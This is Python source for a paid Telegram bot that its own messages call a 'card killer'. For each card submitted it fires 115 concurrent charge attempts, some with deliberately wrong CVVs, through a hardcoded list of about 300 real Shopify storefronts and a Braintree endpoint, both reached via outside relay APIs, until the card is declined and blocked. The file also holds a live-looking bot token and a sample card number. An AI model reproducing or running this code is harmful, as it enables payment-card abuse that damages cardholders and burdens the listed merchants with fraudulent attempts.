import asyncio
import random
import logging
import time
import json
import os
import re
import secrets
import aiohttp
from datetime import datetime

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes

# ================= CONFIG =================
TOKEN = "7679364536:AAHEwAKja_ku1CnmzP7iDlt8em8xSOPhqBE"
OWNER_ID = 7446400377

# All Shopify sites (merged unique list from both old and new)
SHOPIFY_SITES = [
    "https://healthyharvest-com.myshopify.com",
    "https://hearing-milestones.myshopify.com",
    "https://equipmentplus.myshopify.com",
    "https://cremo-us.myshopify.com",
    "https://ecs-automotive-concepts.myshopify.com",
    "https://fiercelymeboutique.myshopify.com",
    "https://dsquared-clothing.myshopify.com",
    "https://full-moon-loom.myshopify.com",
    "https://dulcetshop.myshopify.com",
    "https://gorgeous-rx.myshopify.com",
    "https://grafvonfabercastellusa.myshopify.com",
    "https://freedomfiler.myshopify.com",
    "https://dogdogcat.myshopify.com",
    "https://hair-chemist.myshopify.com",
    "https://finchberry.myshopify.com",
    "https://ducloslenses.myshopify.com",
    "https://ecovenger.myshopify.com",
    "https://cy0517.myshopify.com",
    "https://darenmartin-com.myshopify.com",
    "https://d0e086-3.myshopify.com",
    "https://ernest-supplies.myshopify.com",
    "https://colonial-needle-company.myshopify.com",
    "https://goodloops.myshopify.com",
    "https://comfort1shoes.myshopify.com",
    "https://collector-bookstore.myshopify.com",
    "https://greatergoods-com.myshopify.com",
    "https://clenzoilwebsite.myshopify.com",
    "https://hammam-linen.myshopify.com",
    "https://haystacks-brand.myshopify.com",
    "https://ezvacuum-usa.myshopify.com",
    "https://girl-be-brave.myshopify.com",
    "https://cleetusm.myshopify.com",
    "https://decked-test.myshopify.com",
    "https://commit30.myshopify.com",
    "https://cosmedica-skincare-devsite.myshopify.com",
    "https://getondown.myshopify.com",
    "https://danielkraftmann.myshopify.com",
    "https://flannel-candle-co.myshopify.com",
    "https://woofsandmiaus.myshopify.com",
    "https://demkoknives.myshopify.com",
    "https://doctoraromas.myshopify.com",
    "https://enjoyzibra.myshopify.com",
    "https://collegepress.myshopify.com",
    "https://dillidalli-eyewear.myshopify.com",
    "https://evidence-based-birth.myshopify.com",
    "https://cocoapink.myshopify.com",
    "https://coral-nano-silver-toothpaste.myshopify.com",
    "https://graymatterco.myshopify.com",
    "https://darkaz-and-frames.myshopify.com",
    "https://groovewasher.myshopify.com",
    "https://experiment-beauty.myshopify.com",
    "https://classy-cards-creative.myshopify.com",
    "https://corsaclassic.myshopify.com",
    "https://day-rate-beauty.myshopify.com",
    "https://free-woman-apparel-llc.myshopify.com",
    "https://grillblazer.myshopify.com",
    "https://cs-io.myshopify.com",
    "https://classic-british-spares-2.myshopify.com",
    "https://dakotaangler.myshopify.com",
    "https://deals-gap.myshopify.com",
    "https://happiertogive.myshopify.com",
    "https://gjenmi.myshopify.com",
    "https://grocynet.myshopify.com",
    "https://healthy-spot.myshopify.com",
    "https://collettes-cottage.myshopify.com",
    "https://common-good-shop.myshopify.com",
    "https://d6a229-a5.myshopify.com",
    "https://disegno-fine-jewellery.myshopify.com",
    "https://earthlyadornments-com.myshopify.com",
    "https://elanmakeupstudio.myshopify.com",
    "https://few-of-a-kind-store.myshopify.com",
    "https://goose-ridge-soaps-llc.myshopify.com",
    "https://graftobian-make-up-company.myshopify.com",
    "https://heartblood-cacao.myshopify.com",
    "https://doggielawn.myshopify.com",
    "https://dinowax.myshopify.com",
    "https://hangerbee.myshopify.com",
    "https://drury-outdoors.myshopify.com",
    "https://frylashes.myshopify.com",
    "https://defy-mfg-co.myshopify.com",
    "https://colorway-arts.myshopify.com",
    "https://door-county-candle.myshopify.com",
    "https://dandy-lions-cosmetics.myshopify.com",
    "https://elderlyinstruments.myshopify.com",
    "https://discountshoptools.myshopify.com",
    "https://granite-state-candy-shop.myshopify.com",
    "https://clothandpaperco.myshopify.com",
    "https://dalen-products-store.myshopify.com",
    "https://detectorwarehouse.myshopify.com",
    "https://divine-equestrian.myshopify.com",
    "https://ecoestic.myshopify.com",
    "https://contractortool.myshopify.com",
    "https://equine-comfort-products.myshopify.com",
    "https://grandmaslyesoap.myshopify.com",
    "https://daxinternational.myshopify.com",
    "https://grainvine.myshopify.com",
    "https://dotter.myshopify.com",
    "https://coco-and-breezy-eyewear.myshopify.com",
    "https://chimp-haven-merch.myshopify.com",
    "https://heartell-press.myshopify.com",
    "https://dare2bartzy2-com.myshopify.com",
    "https://cognitive-surplus.myshopify.com",
    "https://deathwish.myshopify.com",
    "https://classicautoreproductions.myshopify.com",
    "https://cortland.myshopify.com",
    "https://daddies-board-shop.myshopify.com",
    "https://corpsbuckle.myshopify.com",
    "https://climb-smart-shop.myshopify.com",
    "https://complyfoamus.myshopify.com",
    "https://cleclothingco.myshopify.com",
    "https://divinity-boutique-gifts.myshopify.com",
    "https://double-hh-thrifty.myshopify.com",
    "https://fs2supplyco.myshopify.com",
    "https://greek-necessities.myshopify.com",
    "https://gregorysgraphics.myshopify.com",
    "https://gumbeauxgators.myshopify.com",
    "https://happysprinkles.myshopify.com",
    "https://hartford-prints-store.myshopify.com",
    "https://hawkwatch-international.myshopify.com",
    "https://heather-louise-jewelry.myshopify.com",
    "https://hamicobrush.myshopify.com",
    "https://germblocker.myshopify.com",
    "https://chick-from-chick-invitations.myshopify.com",
    "https://grill-masters-club.myshopify.com",
    "https://cutenenithings.myshopify.com",
    "https://comfy-kiln-studio.myshopify.com",
    "https://dura-coating-technology.myshopify.com",
    "https://emmaonesock.myshopify.com",
    "https://grdn.myshopify.com",
    "https://dale-audrey-oral-fitness-inc.myshopify.com",
    "https://delsbrix.myshopify.com",
    "https://endurance-products-company.myshopify.com",
    "https://gender-reveal-celebrations.myshopify.com",
    "https://clover-baby-and-kids.myshopify.com",
    "https://cold-moon-collective.myshopify.com",
    "https://corgi-things.myshopify.com",
    "https://df6892-b8.myshopify.com",
    "https://fig-andfern.myshopify.com",
    "https://gritomatic.myshopify.com",
    "https://getsheetdoneplanners-com.myshopify.com",
    "https://cristyscollection.myshopify.com",
    "https://ec0c2a.myshopify.com",
    "https://economy-aquatic-gardens.myshopify.com",
    "https://cocos-variety.myshopify.com",
    "https://crspotless.myshopify.com",
    "https://cucucovers.myshopify.com",
    "https://d58ecf-f0.myshopify.com",
    "https://grayandhound.myshopify.com",
    "https://drd-wholesale-silicone-beads.myshopify.com",
    "https://gray-heron-blankets.myshopify.com",
    "https://davids-toothpaste.myshopify.com",
    "https://drkstenncans.myshopify.com",
    "https://clivecoffee.myshopify.com",
    "https://dudeproducts.myshopify.com",
    "https://gifted-la.myshopify.com",
    "https://crystalynkae.myshopify.com",
    "https://cultneverdies.myshopify.com",
    "https://eco-led-mart.myshopify.com",
    "https://classic-cycling.myshopify.com",
    "https://funnysunnylps.myshopify.com",
    "https://gentsbarbershopspa.myshopify.com",
    "https://habersham-candle.myshopify.com",
    "https://combatflipflops.myshopify.com",
    "https://delphinium-beauty-products.myshopify.com",
    "https://edge-right.myshopify.com",
    "https://coffee-junkie.myshopify.com",
    "https://creative-energy-candles.myshopify.com",
    "https://dafna-beauty.myshopify.com",
    "https://damore-engineering.myshopify.com",
    "https://girl-upcycled.myshopify.com",
    "https://grey-jam-press.myshopify.com",
    "https://dogbed4less.myshopify.com",
    "https://gift-horse-8649.myshopify.com",
    "https://colonial-candle.myshopify.com",
    "https://fuckingballoons-com.myshopify.com",
    "https://crystaldeo.myshopify.com",
    "https://hausandgarten.myshopify.com",
    "https://decalcomania-llc.myshopify.com",
    "https://down-feather-co.myshopify.com",
    "https://fast-track-usa.myshopify.com",
    "https://green-tidings.myshopify.com",
    "https://dapper-wise.myshopify.com",
    "https://dropdead-design-studios.myshopify.com",
    "https://emil-erwin.myshopify.com",
    "https://40f919.myshopify.com",
    "https://arcademachines-com.myshopify.com",
    "https://anaheimfeed.myshopify.com",
    "https://bacchus-and-barleycorn.myshopify.com",
    "https://a038bc.myshopify.com",
    "https://aramara-beauty.myshopify.com",
    "https://acawso.myshopify.com",
    "https://arrowsafetydevice.myshopify.com",
    "https://bradley-packaging.myshopify.com",
    "https://badukclub.myshopify.com",
    "https://bagandtote.myshopify.com",
    "https://blisshaus.myshopify.com",
    "https://all-american-balloons.myshopify.com",
    "https://bulk-tumblers.myshopify.com",
    "https://brewcitybrand.myshopify.com",
    "https://action-toys.myshopify.com",
    "https://arkel-bike-bags.myshopify.com",
    "https://big-star-lights-na.myshopify.com",
    "https://busy-benny.myshopify.com",
    "https://alchemy-forall.myshopify.com",
    "https://bestpysanky.myshopify.com",
    "https://blossomboxjewelry.myshopify.com",
    "https://52kards.myshopify.com",
    "https://6652aa.myshopify.com",
    "https://acdc-mt.myshopify.com",
    "https://arkansas-outdoor-power-equipment.myshopify.com",
    "https://allergystore-com.myshopify.com",
    "https://bc123b-3.myshopify.com",
    "https://amplifycosmetics.myshopify.com",
    "https://beezeeart.myshopify.com",
    "https://8b90b1-4.myshopify.com",
    "https://back-by-popular-demand-consignment-inc.myshopify.com",
    "https://agrariaome.myshopify.com",
    "https://ae5364.myshopify.com",
    "https://battery-hub.myshopify.com",
    "https://beads-to-live-by.myshopify.com",
    "https://51d2d5-04.myshopify.com",
    "https://688a39-2.myshopify.com",
    "https://artboxvan.myshopify.com",
    "https://8b88bd-2.myshopify.com",
    "https://americanblossomlinens.myshopify.com",
    "https://american-soft-linen.myshopify.com",
    "https://aestheticsbykell.myshopify.com",
    "https://beautyswab.myshopify.com",
    "https://artistry-cards.myshopify.com",
    "https://freshwaterconservationcanada.myshopify.com",
    "https://getevo.myshopify.com",
    "https://coral-cottage-boutiques.myshopify.com",
    "https://clean-slate-goods.myshopify.com",
    "https://d95ccc.myshopify.com",
    "https://elastic-band-co.myshopify.com",
    "https://d16b88-49.myshopify.com",
    "https://douglas-sweets.myshopify.com",
    "https://eye-of-love.myshopify.com",
    "https://decants.myshopify.com",
    "https://cloverscharmbar.myshopify.com",
    "https://dimple-divot.myshopify.com",
    "https://fuzzibunzdiapers.myshopify.com",
    "https://e68952-0d.myshopify.com",
    "https://divina-esencial-llc.myshopify.com",
    "https://elegant-barber-zone.myshopify.com",
    "https://eighth-generation.myshopify.com",
    "https://grimblades.myshopify.com",
    "https://cold-hose.myshopify.com",
    "https://dream-hammock4271.myshopify.com",
    "https://elittledirect.myshopify.com",
    "https://clksupplies.myshopify.com",
    "https://chique-tools.myshopify.com",
    "https://china-synergy-group.myshopify.com",
    "https://dalton06.myshopify.com",
    "https://funwateroutdoor.myshopify.com",
    "https://cuddlology.myshopify.com",
    "https://comic-pro-line.myshopify.com",
    "https://cora-ball.myshopify.com",
    "https://earthpaint.myshopify.com",
    "https://endure-industries.myshopify.com",
    "https://dulci-sweets.myshopify.com",
    "https://duckietown.myshopify.com",
    "https://crownpointgraphics.myshopify.com",
    "https://filmneverdie-com.myshopify.com",
    "https://cooltoolsus.myshopify.com",
    "https://d-energy.myshopify.com",
    "https://daily-kairos.myshopify.com",
    "https://equator-dev.myshopify.com",
    "https://corita.myshopify.com",
    "https://colour-streams.myshopify.com",
    "https://ecolunchboxes.myshopify.com",
    "https://dark-matter-coffee.myshopify.com",
    "https://grace-girl-beads.myshopify.com",
    "https://child-to-cherish.myshopify.com",
    "https://contact-8801710479361.myshopify.com",
    "https://cordee-cases.myshopify.com",
    "https://cruzbike-com.myshopify.com",
    "https://wild-thunder-gel-nails.myshopify.com",
    "https://thebrokentoken.myshopify.com",
    "https://www-ohhmygoodness-com.myshopify.com",
    "https://a-thrifty-notion.myshopify.com",
    "https://skonecosmetics.myshopify.com",
    "https://sexy-sparkles-fashion-jewelry.myshopify.com",
    "https://humdrum-paper.myshopify.com",
    "https://crimsonandclover.myshopify.com",
    "https://aspenkaynaturals.myshopify.com",
    "https://art-o-fabric.myshopify.com",
    "https://artlia-webshop.myshopify.com",
    "https://beadsmakemehappy.myshopify.com",
    "https://bluelandhome.myshopify.com",
    "https://c5798e.myshopify.com",
    "https://c8-nail-supply.myshopify.com",
    "https://israelbookshop.myshopify.com",
    "https://ignik-outdoors.myshopify.com",
    "https://iring-com.myshopify.com",
    "https://innovativeconcrete.myshopify.com",
    "https://idea-studio-lagrange-il.myshopify.com",
    "https://knours-us.myshopify.com",
    "https://missy-mae-tutus.myshopify.com",
    "https://merci-handy-us.myshopify.com",
    "https://mikey-and-mia.myshopify.com",
    "https://militaryoverstock.myshopify.com",
    "https://one-condoms.myshopify.com",
    "https://the-pet-glider.myshopify.com",
    "https://third-lennox-flowers.myshopify.com",
    "https://viridiangaming.myshopify.com",
    "https://widgetco-inc.myshopify.com",
    "https://yourthreads.myshopify.com",
    "https://yearpins.myshopify.com",
    "https://panicfabrications.com",
    "https://awesome-store-h7366.myshopify.com",
    "https://bambinosbabyfood.myshopify.com",
    "https://chicologyinc.myshopify.com",
    "https://doctorqs.myshopify.com",
    "https://grandma-lucys.myshopify.com",
    "https://louveredroofkit.myshopify.com",
    "https://ozark-compost-swap.myshopify.com",
    "https://onofriends.myshopify.com",
    "https://ultrapress.myshopify.com",
    "https://underdog-brand.myshopify.com",
    "https://zefiro-chicago.myshopify.com",
]

SHOPIFY_API_URL = "https://web-production-b4ec9.up.railway.app/shopify"
BRAINTREE_API1 = "https://braintree-charged.onrender.com/braintree"

# Concurrency
SHOPIFY_CONCURRENCY = 50   # increased to handle 100 requests quickly
BRAINTREE_CONCURRENCY = 5
REQUEST_TIMEOUT = 10

# Files
DATA_FILE = "user_data.json"
ADMIN_FILE = "admins.json"
CODES_FILE = "codes.json"

PLANS = {
    1: {"days": 1, "credits": 120},
    2: {"days": 7, "credits": 470},
    3: {"days": 15, "credits": 1020},
    4: {"days": 30, "credits": 2500},
}

logging.basicConfig(level=logging.INFO)

# ================= DATA FUNCTIONS =================
def load_json(file):
    if not os.path.exists(file):
        return {}
    with open(file, "r") as f:
        return json.load(f)

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=4)

def get_user_data(user_id):
    data = load_json(DATA_FILE)
    uid = str(user_id)
    if uid not in data:
        return {"credits": 0, "expiry": 0}
    return data[uid]

def set_user_data(user_id, credits, expiry):
    data = load_json(DATA_FILE)
    data[str(user_id)] = {"credits": credits, "expiry": expiry}
    save_json(DATA_FILE, data)

def add_credits(user_id, amount):
    ud = get_user_data(user_id)
    ud["credits"] += amount
    set_user_data(user_id, ud["credits"], ud["expiry"])

def deduct_credits(user_id, amount):
    ud = get_user_data(user_id)
    if ud["credits"] >= amount:
        ud["credits"] -= amount
        set_user_data(user_id, ud["credits"], ud["expiry"])
        return True
    return False

def is_premium(user_id):
    ud = get_user_data(user_id)
    return ud["expiry"] > time.time() or user_id == OWNER_ID

def get_credits(user_id):
    return get_user_data(user_id)["credits"]

def get_expiry_str(user_id):
    exp = get_user_data(user_id)["expiry"]
    if exp == 0:
        return "No active plan"
    if user_id == OWNER_ID:
        return "Lifetime (Owner)"
    return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")

def assign_plan(user_id, plan_id):
    plan = PLANS[plan_id]
    new_expiry = time.time() + plan["days"] * 86400
    set_user_data(user_id, plan["credits"], new_expiry)

# ================= ADMIN FUNCTIONS =================
def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    admins = load_json(ADMIN_FILE)
    return str(user_id) in admins

def add_admin(user_id):
    admins = load_json(ADMIN_FILE)
    admins[str(user_id)] = True
    save_json(ADMIN_FILE, admins)

def remove_admin(user_id):
    admins = load_json(ADMIN_FILE)
    if str(user_id) in admins:
        del admins[str(user_id)]
        save_json(ADMIN_FILE, admins)
        return True
    return False

def generate_code(credits):
    code = secrets.token_urlsafe(12)
    codes = load_json(CODES_FILE)
    codes[code] = {"credits": credits, "used": False}
    save_json(CODES_FILE, codes)
    return code

def redeem_code(code, user_id):
    codes = load_json(CODES_FILE)
    if code not in codes or codes[code]["used"]:
        return False, 0
    credits = codes[code]["credits"]
    codes[code]["used"] = True
    save_json(CODES_FILE, codes)
    add_credits(user_id, credits)
    return True, credits

# ================= API CALLS =================
async def report_error_to_owner(context, api_name, error_msg, card_str=""):
    if OWNER_ID:
        await context.bot.send_message(
            OWNER_ID,
            f"⚠️ *API Error Report*\nAPI: `{api_name}`\nCard: `{card_str}`\nError: `{error_msg[:200]}`",
            parse_mode=ParseMode.MARKDOWN
        )

class SharedSession:
    def __init__(self):
        self.session = None
    async def get_session(self):
        if self.session is None:
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            self.session = aiohttp.ClientSession(timeout=timeout)
        return self.session
    async def close(self):
        if self.session:
            await self.session.close()

async def check_shopify(session, card_str, use_wrong_cvv, wrong_cvv, context, site):
    original = card_str
    if use_wrong_cvv and wrong_cvv:
        parts = card_str.split('|')
        if len(parts) == 4:
            parts[3] = str(wrong_cvv)
            card_str = '|'.join(parts)
    url = f"{SHOPIFY_API_URL}?site={site}&cc={card_str}"
    try:
        async with session.get(url) as resp:
            try:
                data = await resp.json()
                resp_text = data.get('response') or data.get('status') or str(data)
            except:
                resp_text = await resp.text()
            is_dead = "CARD_DECLINED" in resp_text
            return is_dead, resp_text
    except Exception as e:
        if context:
            await report_error_to_owner(context, f"Shopify ({site})", str(e), original)
        return False, f"Error: {str(e)[:50]}"

async def check_braintree(session, card_str, context):
    url = f"{BRAINTREE_API1}?cc={card_str}"
    try:
        async with session.get(url) as resp:
            try:
                data = await resp.json()
                resp_text = str(data)
            except:
                resp_text = await resp.text()
            lower = resp_text.lower()
            is_dead = any(x in lower for x in ["declined", "invalid", "do not honor", "pick up", "lost", "stolen", "card_declined"])
            return is_dead, resp_text
    except Exception as e:
        if context:
            await report_error_to_owner(context, "Braintree API", str(e), card_str)
        return False, f"Error: {str(e)[:50]}"

# ================= KILL SEQUENCE =================
async def perform_full_kill(card_str, original_cvv, context):
    start_time = time.time()
    shared = SharedSession()
    session = await shared.get_session()

    any_dead = False
    last_shopify_resp = ""
    last_braintree_resp = ""

    # 1. 30 wrong CVV Shopify checks
    wrong_tasks = []
    for _ in range(30):
        wrong_cvv = random.randint(1, 999)
        while wrong_cvv == int(original_cvv):
            wrong_cvv = random.randint(1, 999)
        site = random.choice(SHOPIFY_SITES)
        wrong_tasks.append(check_shopify(session, card_str, True, wrong_cvv, context, site))
    wrong_results = await asyncio.gather(*wrong_tasks)
    for dead, resp in wrong_results:
        last_shopify_resp = resp
        if dead:
            any_dead = True

    # 2. 70 correct CVV Shopify checks
    correct_tasks = []
    for _ in range(70):
        site = random.choice(SHOPIFY_SITES)
        correct_tasks.append(check_shopify(session, card_str, False, None, context, site))
    correct_results = await asyncio.gather(*correct_tasks)
    for dead, resp in correct_results:
        last_shopify_resp = resp
        if dead:
            any_dead = True

    # 3. 15 Braintree checks
    bt_tasks = [check_braintree(session, card_str, context) for _ in range(15)]
    bt_results = await asyncio.gather(*bt_tasks)
    for dead, resp in bt_results:
        last_braintree_resp = resp
        if dead:
            any_dead = True

    await shared.close()
    total_time = time.time() - start_time
    total_attempts = 30 + 70 + 15  # 115
    return any_dead, total_attempts, last_shopify_resp, last_braintree_resp, total_time

# ================= PARSE CARD =================
def extract_card_details(text):
    text = text.replace('\n', ' ').replace(',', ' ')
    # Pipe format
    if '|' in text:
        parts = text.split('|')
        if len(parts) >= 4:
            cc = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year_raw = parts[2].strip()
            cvv = parts[3].strip()
            if len(year_raw) == 2:
                year = '20' + year_raw
            else:
                year = year_raw
            if cc.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit():
                return cc, month, year, cvv
    # Regex fallback
    card_match = re.search(r'\b(?:card\s*(?:number|no|#)?\s*:?\s*)?(\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4})\b', text, re.I)
    if card_match:
        cc = re.sub(r'[\s-]', '', card_match.group(1))
    else:
        card_match = re.search(r'\b(\d{15,16})\b', text)
        if not card_match:
            return None
        cc = card_match.group(1)
    cvv_match = re.search(r'\b(?:cvv|cvc|cvv2|security\s*code)\s*:?\s*(\d{3,4})\b', text, re.I)
    if not cvv_match:
        cvv_match = re.search(r'\b(\d{3,4})\b', text)
    if not cvv_match:
        return None
    cvv = cvv_match.group(1)
    exp_match = re.search(r'\b(?:exp|expiry|expiration|valid thru?)\s*:?\s*(\d{1,2})[/.-](\d{2,4})\b', text, re.I)
    if not exp_match:
        exp_match = re.search(r'\b(\d{1,2})[/.-](\d{2,4})\b', text)
    if not exp_match:
        exp_match = re.search(r'\b(?:jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)[a-z]*\s+(\d{2,4})\b', text, re.I)
        if exp_match:
            month_map = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
            month_str = re.search(r'(jan|feb|mar|apr|may|jun|jul|aug|sep|oct|nov|dec)', text, re.I).group(1).lower()
            month = str(month_map[month_str]).zfill(2)
            year = exp_match.group(1)
            if len(year) == 2:
                year = '20' + year
            return cc, month, year, cvv
    if not exp_match:
        return None
    month = exp_match.group(1).zfill(2)
    year = exp_match.group(2)
    if len(year) == 2:
        year = '20' + year
    return cc, month, year, cvv

# ================= TELEGRAM COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    expiry_str = get_expiry_str(user_id)
    plan_text = "Active" if is_premium(user_id) else "Expired/Free"
    text = (
        f"[⌬] COMMAND LIST\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] Yᴏᴜʀ Cʀᴇᴅɪᴛs: `{credits}`\n"
        f"[⌬] Yᴏᴜʀ Pʟᴀɴ: {plan_text}\n"
        f"[⌬] Expires: `{expiry_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] CARDS KILLER (5 ᴄʀᴇᴅɪᴛs/ᴜsᴇ)\n"
        f"────────────────────\n"
        f"/ko     - Kɪʟʟᴇʀ - 100 Shopify + 15 Braintree (115 total, <12s)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Use `/redeem <code>` to add credits.\n"
        f"Admin commands: `/key`, `/addadmin`, `/removeadmin`, `/plan`\n"
        f"View plans: `/plan`"
    )
    if user_id == OWNER_ID:
        text += "\n\n👑 *Owner powers active* – you receive error reports."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def plan_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"[⌤] Plan 1 (1 Day) → 120 credits\n"
        f"[⌤] Plan 2 (7 Days) → 470 credits\n"
        f"[⌤] Plan 3 (15 Days) → 1020 credits\n"
        f"[⌤] Plan 4 (30 Days) → 2500 credits\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Contact admin to purchase."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    if credits < 5:
        await update.message.reply_text(
            "❌ *Insufficient credits!* Need 5 credits per kill.\nUse `/redeem` or `/plan`.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    full_text = update.message.text
    if full_text.startswith('/ko'):
        full_text = full_text[3:].strip()
    elif full_text.startswith('/Ko'):
        full_text = full_text[3:].strip()
    else:
        full_text = ' '.join(context.args) if context.args else ""

    if not full_text:
        await update.message.reply_text(
            "❌ Usage: `/ko <card details>`\nExamples:\n`/ko 4147400394606212|520|07|2028`\n`/ko Card Number: 4147400394606212 CVV: 520 Expiry: 07/2028`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    extracted = extract_card_details(full_text)
    if not extracted:
        await update.message.reply_text(
            "❌ Could not extract card details. Need card number, CVV, expiry.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    card, month, year, cvv = extracted
    card_str = f"{card}|{month}|{year}|{cvv}"

    processing = await update.message.reply_text(
        "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳\n(115 concurrent attempts – please wait)", 
        parse_mode=ParseMode.MARKDOWN
    )

    killed, attempts, shop_resp, bt_resp, elapsed = await perform_full_kill(card_str, cvv, context)

    if killed:
        deduct_credits(user_id, 5)
        new_balance = get_credits(user_id)
        result = (
            f"┏━━━━━━━⍟\n"
            f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"[⌬] Cᴀʀᴅ↬ `{card_str}`\n"
            f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ\n"
            f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ {attempts} Tɪᴍᴇs\n"
            f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
            f"[⌬] Bᴏᴛ Bʏ↬ ༒ 𝑺𝒕𝒐𝒓𝒎𝒀𝑻 ༒\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Cʀᴇᴅɪᴛs Dᴇᴅᴜᴄᴛᴇᴅ - 5 | Bᴀʟᴀɴᴄᴇ - {new_balance}"
        )
    else:
        result = (
            f"❌ *Kill failed!* No dead response.\n"
            f"Processed: {attempts} Times | Time: {elapsed:.2f}s\n"
            f"Last Shopify: `{shop_resp[:80]}`\n"
            f"Last Braintree: `{bt_resp[:80]}`\n"
            f"*No credits deducted.*"
        )
    await processing.delete()
    await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/redeem <code>`", parse_mode=ParseMode.MARKDOWN)
        return
    success, credits = redeem_code(args[0], update.effective_user.id)
    if success:
        await update.message.reply_text(f"✅ Redeemed `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Invalid or used code.", parse_mode=ParseMode.MARKDOWN)

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: `/key <quantity> <credits>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        qty, val = int(args[0]), int(args[1])
        if qty <= 0 or val <= 0: raise ValueError
    except:
        await update.message.reply_text("Invalid numbers.", parse_mode=ParseMode.MARKDOWN)
        return
    codes = [generate_code(val) for _ in range(qty)]
    await update.message.reply_text(f"✅ Generated {qty} codes worth {val} credits:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/addadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target = int(args[0])
        add_admin(target)
        await update.message.reply_text(f"✅ User `{target}` is now admin.", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)

async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("⛔ Owner only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: `/removeadmin <user_id>`", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        target = int(args[0])
        if remove_admin(target):
            await update.message.reply_text(f"✅ User `{target}` is no longer admin.", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"❌ User `{target}` was not admin.", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)

async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("⛔ Admin only.", parse_mode=ParseMode.MARKDOWN)
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: `/plan <plan_id> <user_id>` (1-4)", parse_mode=ParseMode.MARKDOWN)
        return
    try:
        plan_id = int(args[0])
        target = int(args[1])
        if plan_id not in PLANS:
            raise ValueError
        assign_plan(target, plan_id)
        plan = PLANS[plan_id]
        await update.message.reply_text(f"✅ Plan {plan_id} assigned to `{target}`: {plan['days']} days, {plan['credits']} credits.", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("Invalid plan ID (1-4) or user ID.", parse_mode=ParseMode.MARKDOWN)

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("plan", plan_menu))
    app.add_handler(CommandHandler("ko", kill))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("plan", plan_assign))
    print("🔥 Fast killer bot ready: 100 Shopify + 15 Braintree (115 total, <12s)")
    print(f"👑 Owner ID: {OWNER_ID}")
    app.run_polling()

if __name__ == "__main__":
    main()
